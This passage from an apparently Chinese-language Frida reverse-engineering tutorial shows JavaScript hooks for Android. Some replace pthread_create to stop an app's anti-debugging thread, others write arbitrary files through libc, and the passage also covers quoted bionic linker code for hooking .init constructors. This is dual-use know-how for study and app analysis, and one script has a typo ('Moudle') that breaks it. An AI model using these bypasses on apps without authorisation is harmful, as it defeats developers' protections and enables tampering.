class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                 instance.<span class="title function_">init</span>()</span><br><span class="line">             &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;serach complete!&quot;</span>)&#125;</span><br><span class="line">         &#125;)        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">replace_pthread</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;pthread_create&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pthread_create_addr =&gt; &quot;</span>,pthread_create_addr)</span><br><span class="line">    <span class="comment">//替换掉之前先来一个主动调用</span></span><br><span class="line">    <span class="keyword">var</span> pthread_create = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(pthread_create_addr,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(pthread_create_addr,<span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span>(<span class="params">parg1,parg2,parg3,parg4</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(parg1,parg2,parg3,parg4)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">pthread_create</span>(parg1,parg2,parg3,parg4)</span><br><span class="line">    &#125;,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>]))</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(replace_pthread)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.12.5.png" class=""><p>让整个反调试的<code>pthread_create()</code>函数不执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">beginAnti</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.demoso1.MainActivity&quot;</span>,&#123;</span><br><span class="line">             <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                 <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                 instance.<span class="title function_">init</span>()</span><br><span class="line">             &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;serach complete!&quot;</span>)&#125;</span><br><span class="line">         &#125;)        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">replace_pthread</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;pthread_create&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pthread_create_addr =&gt; &quot;</span>,pthread_create_addr)</span><br><span class="line">    <span class="comment">//替换掉之前先来一个主动调用</span></span><br><span class="line">    <span class="keyword">var</span> pthread_create = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(pthread_create_addr,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(pthread_create_addr,<span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span>(<span class="params">parg1,parg2,parg3,parg4</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(parg1,parg2,parg3,parg4)</span><br><span class="line">        <span class="keyword">var</span> libnativebaseaddress = <span class="title class_">Moudle</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(libnativebaseaddress != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libnaticebaseaddress =&gt; &quot;</span>,libnativebaseaddress)</span><br><span class="line">            <span class="keyword">if</span>(parg3-libnativebaseaddress == <span class="number">64900</span>)&#123;</span><br><span class="line">                <span class="comment">//为什么这里可以为空，而attach不行？</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">pthread_create</span>(parg1,parg2,parg3,parg4)</span><br><span class="line">    &#125;,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>]))</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(replace_pthread)</span><br></pre></td></tr></table></figure><h3 id="9-2-2-hook-fopen-fputs-fclose"><a href="#9-2-2-hook-fopen-fputs-fclose" class="headerlink" title="9.2.2 hook fopen fputs fclose"></a>9.2.2 hook fopen fputs fclose</h3><p>主动调用<code>libc.so</code>中的<code>fopen()</code>、<code>fputs()</code>、<code>fclose()</code>向内存中写东西。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">writeSomething</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> fopen_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>,<span class="string">&quot;fopen&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> fputs_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>,<span class="string">&quot;fputs&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> fclose_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>,<span class="string">&quot;fclose&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fopen =&gt; &quot;</span>, fopen_addr,<span class="string">&quot;fpunts =&gt; &quot;</span>,fputs_addr,<span class="string">&quot;fclose =&gt; &quot;</span>,fclose_addr)</span><br><span class="line">    <span class="keyword">var</span> fopen = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fopen_addr,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    <span class="keyword">var</span> fputs = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fputs_addr,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    <span class="keyword">var</span> fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fclose_addr,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//保证路径有写权限，否则会出错</span></span><br><span class="line">    <span class="keyword">var</span> fileName = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/sdcard/v5le0n9.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> mode = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;w+&quot;</span>)<span class="comment">//重写</span></span><br><span class="line">    <span class="keyword">var</span> fp = <span class="title function_">fopen</span>(fileName,mode)</span><br><span class="line">    <span class="keyword">var</span> content = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;Hello from frida&quot;</span>)</span><br><span class="line">    <span class="title function_">fputs</span>(content,fp)</span><br><span class="line">    <span class="title function_">fclose</span>(fp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(writeSomething)</span><br></pre></td></tr></table></figure><p>将路径和内容抽出来作为参数传入，就可以在任意地方写任意东西了。比如将“设置”App中所有的导出函数写进文件中。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">writeSomething</span>(<span class="params">path,contents</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> fopen_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>,<span class="string">&quot;fopen&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> fputs_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>,<span class="string">&quot;fputs&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> fclose_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>,<span class="string">&quot;fclose&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fopen =&gt; &quot;</span>, fopen_addr,<span class="string">&quot;fpunts =&gt; &quot;</span>,fputs_addr,<span class="string">&quot;fclose =&gt; &quot;</span>,fclose_addr)</span><br><span class="line">    <span class="keyword">var</span> fopen = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fopen_addr,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    <span class="keyword">var</span> fputs = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fputs_addr,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    <span class="keyword">var</span> fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fclose_addr,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//保证路径有写权限，否则会出错</span></span><br><span class="line">    <span class="keyword">var</span> fileName = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(path)</span><br><span class="line">    <span class="keyword">var</span> mode = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;a+&quot;</span>)<span class="comment">//追加</span></span><br><span class="line">    <span class="keyword">var</span> fp = <span class="title function_">fopen</span>(fileName,mode)</span><br><span class="line">    <span class="keyword">var</span> content = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(contents)</span><br><span class="line">    <span class="title function_">fputs</span>(content,fp)</span><br><span class="line">    <span class="title function_">fclose</span>(fp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">EnumerateAllExports</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> modules = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>()</span><br><span class="line">    <span class="comment">//console.log(&quot;Process.enumerateModules =&gt; &quot;,JSON.stringfy(modules))</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;modules.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable language_">module</span> = modules[i]</span><br><span class="line">        <span class="keyword">var</span> module_name = modules[i].<span class="property">name</span></span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="variable language_">module</span>.<span class="title function_">enumerateExports</span>()        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;module_name =&gt; &quot;</span>,module_name,<span class="string">&quot;module.enumerateExports =&gt; &quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>))</span><br><span class="line">        <span class="comment">//exports中有三个属性：type，name，address</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> m=<span class="number">0</span>; m&lt;<span class="built_in">exports</span>.<span class="property">length</span>; m++)&#123;</span><br><span class="line">            <span class="title function_">writeSomething</span>(<span class="string">&quot;/sdcard/settings/&quot;</span>+module_name+<span class="string">&quot;.txt&quot;</span>,<span class="string">&quot;type:&quot;</span>+<span class="built_in">exports</span>[m].<span class="property">type</span>+<span class="string">&quot; name:&quot;</span>+<span class="built_in">exports</span>[m].<span class="property">name</span>+<span class="string">&quot; address:&quot;</span>+<span class="built_in">exports</span>[m].<span class="property">address</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title class_">EnumerateAllExports</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.android.setting -l libc.js --no-pause</span><br></pre></td></tr></table></figure><h2 id="9-3-linker框架层的hook利用"><a href="#9-3-linker框架层的hook利用" class="headerlink" title="9.3 linker框架层的hook利用"></a>9.3 linker框架层的hook利用</h2><p>基于ELF文件的特性，很多加固厂商在进行Android逆向的对抗时，都会在Android的so文件中进行动态的对抗，对抗点一般在so文件的<code>.init</code>段和<code>JNI_OnLoad</code>处。因此，我们在逆向分析各种厂商的加固so时，需要在so文件的<code>.init</code>段和<code>JNI_OnLoad</code>处下断点进行分析，绕过这些加固的so对抗。</p><p>从<code>.init</code>段和<code>.init_array</code>段构造函数的调用实现来看，最终都是调用<code>call_function()</code>函数，因此IDA动态调试so时，只要守住<code>call_function()</code>就可以对<code>.init</code>段和<code>.init_array</code>段构造函数调用的监控。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker_soinfo.cpp</span></span><br><span class="line"><span class="number">388</span>  <span class="type">void</span> <span class="title function_">soinfo::call_constructors</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="number">389</span>    <span class="keyword">if</span> (constructors_called) &#123;</span><br><span class="line"><span class="number">390</span>      <span class="keyword">return</span>;</span><br><span class="line"><span class="number">391</span>    &#125;</span><br><span class="line"><span class="number">392</span>  </span><br><span class="line"><span class="number">393</span>    <span class="comment">// We set constructors_called before actually calling the constructors, otherwise it doesn&#x27;t</span></span><br><span class="line"><span class="number">394</span>    <span class="comment">// protect against recursive constructor calls. One simple example of constructor recursion</span></span><br><span class="line"><span class="number">395</span>    <span class="comment">// is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so:</span></span><br><span class="line"><span class="number">396</span>    <span class="comment">// 1. The program depends on libc, so libc&#x27;s constructor is called here.</span></span><br><span class="line"><span class="number">397</span>    <span class="comment">// 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so.</span></span><br><span class="line"><span class="number">398</span>    <span class="comment">// 3. dlopen() calls the constructors on the newly created</span></span><br><span class="line"><span class="number">399</span>    <span class="comment">//    soinfo for libc_malloc_debug_leak.so.</span></span><br><span class="line"><span class="number">400</span>    <span class="comment">// 4. The debug .so depends on libc, so CallConstructors is</span></span><br><span class="line"><span class="number">401</span>    <span class="comment">//    called again with the libc soinfo. If it doesn&#x27;t trigger the early-</span></span><br><span class="line"><span class="number">402</span>    <span class="comment">//    out above, the libc constructor will be called again (recursively!).</span></span><br><span class="line"><span class="number">403</span>    constructors_called = <span class="literal">true</span>;</span><br><span class="line"><span class="number">404</span>  </span><br><span class="line"><span class="number">405</span>    <span class="keyword">if</span> (!is_main_executable() &amp;&amp; preinit_array_ != nullptr) &#123;</span><br><span class="line"><span class="number">406</span>      <span class="comment">// The GNU dynamic linker silently ignores these, but we warn the developer.</span></span><br><span class="line"><span class="number">407</span>      PRINT(<span class="string">&quot;\&quot;%s\&quot;: ignoring DT_PREINIT_ARRAY in shared library!&quot;</span>, get_realpath());</span><br><span class="line"><span class="number">408</span>    &#125;</span><br><span class="line"><span class="number">409</span>  </span><br><span class="line"><span class="number">410</span>    get_children().for_each([] (soinfo* si) &#123;</span><br><span class="line"><span class="number">411</span>      si-&gt;call_constructors();</span><br><span class="line"><span class="number">412</span>    &#125;);</span><br><span class="line"><span class="number">413</span>  </span><br><span class="line"><span class="number">414</span>    <span class="keyword">if</span> (!is_linker()) &#123;</span><br><span class="line"><span class="number">415</span>      bionic_trace_begin((<span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">&quot;calling constructors: &quot;</span>) + get_realpath()).c_str());</span><br><span class="line"><span class="number">416</span>    &#125;</span><br><span class="line"><span class="number">417</span>  </span><br><span class="line"><span class="number">418</span>    <span class="comment">// DT_INIT should be called before DT_INIT_ARRAY if both are present.</span></span><br><span class="line"><span class="number">419</span>    call_function(<span class="string">&quot;DT_INIT&quot;</span>, init_func_, get_realpath());</span><br><span class="line"><span class="number">420</span>    call_array(<span class="string">&quot;DT_INIT_ARRAY&quot;</span>, init_array_, init_array_count_, <span class="literal">false</span>, get_realpath());</span><br><span class="line"><span class="number">421</span>  </span><br><span class="line"><span class="number">422</span>    <span class="keyword">if</span> (!is_linker()) &#123;</span><br><span class="line"><span class="number">423</span>      bionic_trace_end();</span><br><span class="line"><span class="number">424</span>    &#125;</span><br><span class="line"><span class="number">425</span>  &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">334</span>  <span class="type">static</span> <span class="type">void</span> <span class="title function_">call_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* function_name __unused,</span></span><br><span class="line"><span class="params"><span class="number">335</span>                            <span class="type">linker_ctor_function_t</span> function,</span></span><br><span class="line"><span class="params"><span class="number">336</span>                            <span class="type">const</span> <span class="type">char</span>* realpath __unused)</span> &#123;</span><br><span class="line"><span class="number">337</span>    <span class="keyword">if</span> (function == nullptr || reinterpret_cast&lt;<span class="type">uintptr_t</span>&gt;(function) == static_cast&lt;<span class="type">uintptr_t</span>&gt;(<span class="number">-1</span>)) &#123;</span><br><span class="line"><span class="number">338</span>      <span class="keyword">return</span>;</span><br><span class="line"><span class="number">339</span>    &#125;</span><br><span class="line"><span class="number">340</span>  </span><br><span class="line"><span class="number">341</span>    TRACE(<span class="string">&quot;[ Calling c-tor %s @ %p for &#x27;%s&#x27; ]&quot;</span>, function_name, function, realpath);</span><br><span class="line"><span class="number">342</span>    function(g_argc, g_argv, g_envp);</span><br><span class="line"><span class="number">343</span>    TRACE(<span class="string">&quot;[ Done calling c-tor %s @ %p for &#x27;%s&#x27; ]&quot;</span>, function_name, function, realpath);</span><br><span class="line"><span class="number">344</span>  &#125;</span><br><span class="line"><span class="number">345</span>  </span><br><span class="line"><span class="number">346</span>  <span class="type">static</span> <span class="type">void</span> <span class="title function_">call_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* function_name __unused,</span></span><br><span class="line"><span class="params"><span class="number">347</span>                            <span class="type">linker_dtor_function_t</span> function,</span></span><br><span class="line"><span class="params"><span class="number">348</span>                            <span class="type">const</span> <span class="type">char</span>* realpath __unused)</span> &#123;</span><br><span class="line"><span class="number">349</span>    <span class="keyword">if</span> (function == nullptr || reinterpret_cast&lt;<span class="type">uintptr_t</span>&gt;(function) == static_cast&lt;<span class="type">uintptr_t</span>&gt;(<span class="number">-1</span>)) &#123;</span><br><span class="line"><span class="number">350</span>      <span class="keyword">return</span>;</span><br><span class="line"><span class="number">351</span>    &#125;</span><br><span class="line"><span class="number">352</span>  </span><br><span class="line"><span class="number">353</span>    TRACE(<span class="string">&quot;[ Calling d-tor %s @ %p for &#x27;%s&#x27; ]&quot;</span>, function_name, function, realpath);</span><br><span class="line"><span class="number">354</span>    function();</span><br><span class="line"><span class="number">355</span>    TRACE(<span class="string">&quot;[ Done calling d-tor %s @ %p for &#x27;%s&#x27; ]&quot;</span>, function_name, function, realpath);</span><br><span class="line"><span class="number">356</span>  &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">359</span>  <span class="type">static</span> <span class="type">void</span> <span class="title function_">call_array</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* array_name __unused,</span></span><br><span class="line"><span class="params"><span class="number">360</span>                         F* functions,</span></span><br><span class="line"><span class="params"><span class="number">361</span>                         <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params"><span class="number">362</span>                         <span class="type">bool</span> reverse,</span></span><br><span class="line"><span class="params"><span class="number">363</span>                         <span class="type">const</span> <span class="type">char</span>* realpath)</span> &#123;</span><br><span class="line"><span class="number">364</span>    <span class="keyword">if</span> (functions == nullptr) &#123;</span><br><span class="line"><span class="number">365</span>      <span class="keyword">return</span>;</span><br><span class="line"><span class="number">366</span>    &#125;</span><br><span class="line"><span class="number">367</span>  </span><br><span class="line"><span class="number">368</span>    TRACE(<span class="string">&quot;[ Calling %s (size %zd) @ %p for &#x27;%s&#x27; ]&quot;</span>, array_name, count, functions, realpath);</span><br><span class="line"><span class="number">369</span>  </span><br><span class="line"><span class="number">370</span>    <span class="type">int</span> begin = reverse ? (count - <span class="number">1</span>) : <span class="number">0</span>;</span><br><span class="line"><span class="number">371</span>    <span class="type">int</span> end = reverse ? <span class="number">-1</span> : count;</span><br><span class="line"><span class="number">372</span>    <span class="type">int</span> step = reverse ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line"><span class="number">373</span>  </span><br><span class="line"><span class="number">374</span>    <span class="keyword">for</span> (<span class="type">int</span> i = begin; i != end; i += step) &#123;</span><br><span class="line"><span class="number">375</span>      TRACE(<span class="string">&quot;[ %s[%d] == %p ]&quot;</span>, array_name, i, functions[i]);</span><br><span class="line"><span class="number">376</span>      call_function(<span class="string">&quot;function&quot;</span>, functions[i], realpath);</span><br><span class="line"><span class="number">377</span>    &#125;</span><br><span class="line"><span class="number">378</span>  </span><br><span class="line"><span class="number">379</span>    TRACE(<span class="string">&quot;[ Done calling %s for &#x27;%s&#x27; ]&quot;</span>, array_name, realpath);</span><br><span class="line"><span class="number">380</span>  &#125;</span><br></pre></td></tr></table></figure><p>由于arm64架构中的<code>linker64.so</code>中没有<code>call_function()</code>函数，所以需要强制将App运行在32位模式下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install --abi armeabi-v7a &lt;path to apk&gt;</span><br></pre></td></tr></table></figure><p>hook <code>call_function()</code>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">LogPrint</span>(<span class="params">log</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> theDate = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="keyword">var</span> hour = theDate.<span class="title function_">getHours</span>();</span><br><span class="line">    <span class="keyword">var</span> minute = theDate.<span class="title function_">getMinutes</span>();</span><br><span class="line">    <span class="keyword">var</span> second = theDate.<span class="title function_">getSeconds</span>();</span><br><span class="line">    <span class="keyword">var</span> mSecond = theDate.<span class="title function_">getMilliseconds</span>()</span><br><span class="line"></span><br><span class="line">    hour &lt; <span class="number">10</span> ? hour = <span class="string">&quot;0&quot;</span> + hour : hour;</span><br><span class="line">    minute &lt; <span class="number">10</span> ? minute = <span class="string">&quot;0&quot;</span> + minute : minute;</span><br><span class="line">    second &lt; <span class="number">10</span> ? second = <span class="string">&quot;0&quot;</span> + second : second;</span><br><span class="line">    mSecond &lt; <span class="number">10</span> 